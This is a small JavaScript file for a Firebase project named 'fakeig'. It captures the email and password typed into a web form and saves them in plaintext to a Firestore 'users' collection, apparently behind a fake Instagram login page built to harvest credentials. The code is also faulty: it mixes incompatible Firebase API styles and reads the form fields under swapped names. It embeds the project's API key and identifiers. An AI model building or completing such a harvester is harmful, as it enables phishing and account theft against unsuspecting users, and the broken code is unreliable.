// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getFirestore } from "firebase/firestore";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyBEA70v3DEdadQSsc-p3aMkCRbvXvTD6hk",
    authDomain: "fakeig-b9e44.firebaseapp.com",
    projectId: "fakeig-b9e44",
    storageBucket: "fakeig-b9e44.appspot.com",
    messagingSenderId: "712429451173",
    appId: "1:712429451173:web:f5edf700ed013a0b8d5a4c"
};
// Initialize Firebase
const app = initializeApp(firebaseConfig);

// Initialize Firebase

const db = getFirestore(app);

console.log('asd');
document.querySelector('.form').addEventListener('submit', function (e) {
    e.preventDefault();

    const email = document.querySelector('input[name="name"]').value;
    const password = document.querySelector('input[name="email"]').value;

    db.collection("users").add({
        email: email,
        pass: password
    })
        .then(() => {
            alert("Data submitted");
        })
        .catch((error) => {
            alert("Error adding document: ", error);
        });
});
